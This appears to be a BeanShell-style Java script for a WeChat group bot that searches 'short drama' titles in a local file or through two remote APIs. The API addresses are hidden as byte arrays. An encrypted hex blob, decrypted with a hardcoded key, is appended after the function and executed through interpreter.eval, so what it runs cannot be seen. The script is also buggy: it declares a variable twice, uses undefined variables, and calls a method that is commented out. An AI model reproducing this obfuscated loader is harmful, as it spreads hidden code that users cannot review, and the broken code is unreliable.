public void 短剧功能(Object data) {
	String content = data.content;
	String qun = data.talker;
	String wxid=data.sendTalker;
	String name = getName(wxid);
	if(content.equals("短剧功能")) {
	    String text = "[e]短剧搜索+短剧名";
	    if(wxid.equals(mWxid)) {
	        text += "\n[e]切换资源\n[e]本地资源添加";
	    }
	    sendm(qun,text,0);
	}
	if(content.equals("切换资源") && wxid.equals(mWxid)) {
		String 资源 = getString("短剧资源", "资源", "");
		if(资源.equals("")||资源.equals("2(本地)")) {
			putString("短剧资源", "资源", "1");
			sendm(qun,"已切换为资源1",0);
		} else if(资源.equals("1")) {
			putString("短剧资源", "资源", "2");
			sendm(qun,"已切换为资源2",0);
		} else if(资源.equals("2")) {
			putString("短剧资源", "资源", "2(本地)");
			sendm(qun,"已切换为资源2(本地)",0);
		}else return;
	}
	if(content.equals("本地资源添加")&&wxid.equals(mWxid)) {
	    sendm(qun,"[e]资源添加+内容\n内容格式:短剧名\\n链接\n例:霸道总裁xxx\\nhttpxxx",0);
	}
	if(content.startsWith("短剧搜索")) {
		String 资源 = getString("短剧资源", "资源", "");
		if(资源 == null || 资源.equals("")) {
			资源 = "1";
		}
		String result = "";
		String txt = content.substring(4);
		if("2(本地)".equals(资源)) {
			// 设置要搜索的关键词
			String keyword = content.substring(4);
			// 文件路径
			String logFilePath = JavaPath + "/YingJava/短剧.txt";
			try {
				BufferedReader br = new BufferedReader(new FileReader(logFilePath));
				int resultCount = 0; // 新建一个计数器
				StringBuilder result = new StringBuilder();
				while((line = br.readLine()) != null && resultCount < 5) {
					String[] parts = line.split("\\\\n"); // 使用换行符进行分割
					String filteredStr = parts[0]; // 取得前一部分内容
					if(filteredStr.contains(keyword)) { // 如果这一行包含关键词
						result.append("\n-----" + (resultCount + 1) + "-----\n").append(line);
						resultCount++; // 增加计数器
					}
				}
				int resultCount1 = 0; // 新建一个计数器
				while((line = br.readLine()) != null) {
					String[] parts = line.split("\\\\n"); // 使用换行符进行分割
					String filteredStr = parts[0]; // 取得前一部分内容
					if(filteredStr.contains(keyword)) { // 如果这一行包含关键词
						resultCount1++; // 增加计数器
					}
				}
				if(resultCount == 0) { // 如果没有找到结果
					sendm(qun, "@"+name+"\n资源"+资源 + " 未找到相关内容，您可以换一个关键词试试。",0);
					return;
				}
				sendm(qun, "@"+name+"\n资源"+资源 + " 搜索内容如下" + result.toString().replace("\\n", "\n") + "\n❁只显示前5部❁(共搜索到" + (resultCount + resultCount1) + "部)",0);
				return;
			} catch(IOException e) {
				// 处理文件操作的异常
				sendm(qun, "@"+name+"\n无法访问文件: " + e.getMessage(),0);
				return;
			}
		}
		switch(资源) {
			case "1":
				a = new String(new byte[] {
					104, 116, 116, 112, 58, 47, 47, 122, 104, 117, 46, 108, 111, 118, 101, 117, 105, 100, 46, 99, 110, 47, 110, 101, 119, 100, 106, 47, 115, 115, 46, 112, 104, 112, 63, 116, 105, 116, 108, 101, 61
				}) + txt;
				break;
			case "2":
				a = new String(new byte[] {
					104, 116, 116, 112, 58, 47, 47, 49, 53, 57, 46, 55, 53, 46, 49, 55, 53, 46, 54, 54, 58, 54, 54, 55, 55, 47, 97, 112, 105, 47, 100, 106, 46, 112, 104, 112, 63, 107, 101, 121, 119, 111, 114, 100, 61
				}) + txt;
				break;
			default:
				sendm(qun, "@"+name+"\n错误: 无效的资源" + 资源,0);
				return;
		}
		try {
			a = sendGet(a);
			JSONObject jsonObject = new JSONObject(a);
			JSONArray dataArray = jsonObject.getJSONArray("data");
			int q = Math.min(5, dataArray.length());
			for(int i = 0; i < q; i++) {
				JSONObject item = dataArray.getJSONObject(i);
				result += "\n-----" + (i + 1) + "-----\n" + item.getString("answer");
			}
			if(result.isEmpty()) {
				sendm(qun, "@"+name+"\n资源"+资源 + " 未找到相关内容，您可以换一个关键词试试。",0);
			} else {
				sendm(qun, "@"+name+"\n资源"+资源 + " 搜索内容如下" + result + "\n❁只显示前五部❁(共搜索到" + dataArray.length() + "部)",0);
			}
		} catch(e) {
			sendm(qun, "@"+name+"\n错误: " + e,0);
		}
	}
	if(content.startsWith("资源添加")) {
	    String txt = content.substring(4);
	    if(txt==null||txt.equals("")) {
	        return;
	    }
	    method(JavaPath + "/YingJava/短剧.txt", input);
	    sendm(qun,"添加成功",0);
	}
}
this.interpreter.eval(EncryptUtil.decrypt("bcb9cd2a9a90a42b10d086b7603d43a952ad5dfd6009e50e70497460101b011d76274e49c2d7f4d50fd2561a2bb53533d529e06eaa7e1ad7ce7bd221f7bce05a6f3216a8172bec54a2d9eca062c81a60dc8c08e093d00fc09205bac4d95819d61f72bff7a66f5831c03272376d282b1b08e58876844deab63cd17dd1d0b06ba738c3261cb5c545889da4c1e73290cb5240c838f201f1978e2078ff5e7c4abd82c3757d70446b15376b748b93a75f5da9431e79c3e7ae240d6ccd0e58caef53b82fb7c3c4391794ad029a01ff6862379d0de86cb772363e9af0ba579aae949bf06a9718b16284aeaa5f3e4ce514f5af3806f97bdfb89f46b2750040b0fd35fe91748b7d38ba7b8dd007e98c63ee5917d247fd1738e7bb150976274e49c2d7f4d59da4c1e73290cb52bdba078dd78487b9b27c6d8ba32b12c0c136ee20183c9c5bcd53cd53baeaf16897fdecbaeb6ba827ed94b38513e300b1c0b5fc823d89bb6afc9e7ab6019c721f9da4c1e73290cb529da4c1e73290cb526e595344ee7cf49ade7caddddbea4a4c11784c04613ea839e291f7c642baa276cd2da759d64852469da4c1e73290cb52470029a192f78d1692d2b9ac308aec609da4c1e73290cb529da4c1e73290cb52bc3f89ce9eb0dd93f39b320201c9f5b7713e59deeac76bfd9da4c1e73290cb529da4c1e73290cb521573742f1e9941381537b49764f01cd708c19a647ec634622f6649f245de5afffaa3fd1957e499eeeaac377ca234f71a9da4c1e73290cb529da4c1e73290cb527eed4802773b06643c3c367fa42c341bf0ac1dbf1cb0c7809c6eb046f492755c9da4c1e73290cb5284870b1a1882749c9da4c1e73290cb529dd698f976bed4e725566efbbee89e8f9da4c1e73290cb52b6ac990ab061242df93dfbfc32a90d7a6a7b93dcfa7a19d59da4c1e73290cb520cf39d91a9e6d9e4e1c85c2111585a256cff29306d4ca871645e73a89fb2bf265c568c95044c59b87bcf705a6d4452816a7b93dcfa7a19d59da4c1e73290cb52a8f97db0e9131c1bf843d3bc2398c39ff22a63df8ecac4c0ad25bda738eb864ea7afcc42e271490839e0344a899477b7167002ff9346b201b322bea5fd04a16cdd869efe92790615cd1715342db2c26b9da4c1e73290cb52bdba078dd78487b9b27c6d8ba32b12c0c136ee20183c9c5bcd53cd53baeaf16897fdecbaeb6ba827ed94b38513e300b1c0b5fc823d89bb6afc9e7ab6019c721f9da4c1e73290cb52f2231b735f05e75e823d2fadb99fad18ed5dd2a68dc30fbb13cf7a8e532df08cc7cd84152ae319ce9da4c1e73290cb529c249a04488709c9cd53cd53baeaf16897fdecbaeb6ba827ed94b38513e300b14228bad6581d07f89da4c1e73290cb529da4c1e73290cb52f93f50f3b73b9bb1ffe4703276582fd2024cccd8e9b35433c7cd84152ae319cefcd6145aab2b9fec9da4c1e73290cb52f9a08a66bc73f3d90d214f5294c0e8eb431e79c3e7ae240d2cd3b3c3d3f4d627a8d5cd2abad10facf7ef40f5cd7de07571b04b83de97cdb1402fac92725574d171151922ed45315bcc9ebe1e1977acb2029a01ff6862379d9411b87cc74dc6889d293ea9896d0ee328d5fe500bb73ab00af3dd234e6f7c8e84870b1a1882749c41af3a28b59f0f9a32ecfe3b50d039e23bd297fafb072ece69883226df2322b000073960132601d5a4b029e99cfe4dde3bd297fafb072ece01a221fcb170a4b07527e164fb75788a25566efbbee89e8ff22a63df8ecac4c00bbc446daea96ef4b186cf8958c65dee21fe447766b7084af30cc099cfb3c1e4276ac9325af316461553c1ba87fd4d1b73875394b58ffdc615cbe025832fd7507ad2fb33b817942f9da4c1e73290cb524601e5f3c3137ac6d4124b2be4e3df0178a96491202ce300029a01ff6862379d9da4c1e73290cb524ec4f08fec13f8d9329f2588bd83f231d6c5749310fe35f59da4c1e73290cb5265f67ffe1022f5e443e10e8139628cc29da4c1e73290cb529aa2ecef93de12f34cb2ac6bae6e34e8a9545303c04a3a11029a01ff6862379d9da4c1e73290cb528155c604af3a80cfb090eaf4910eea1d39b1da3f982f635eb16a219017715296963ab8441e28fe1da9545303c04a3a11029a01ff6862379df843d3bc2398c39f6275dfb6d6f7249ea19e937b50224225ea73204019ba60d6d70b5546eb4e6d5c1ed7ad9775e0a6289df65d8fa481a9d329cf91de73bd882c09fc1ab8776af6d1d483cbc07558f4eff44ed11770c8768e15ac9038122175094278f20d774282aeb0954354b02183507e361dffe7eba8bc77ed97e28b1732db3a7a315f014089c4c7cd84152ae319ce5c8609ebf4050ddb9089bd02edd4a8e283817f21594b2bc5","MYwlJava"));
/*public static void method(String file, String conent) {
	BufferedWriter out = null;
	try {
		out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true)));
		out.write("\r\n" + conent);
	} catch(Exception e) {
		e.printStackTrace();
	} finally {
		try {
			out.close();
		} catch(IOException e) {
			e.printStackTrace();
		}
	}
}*/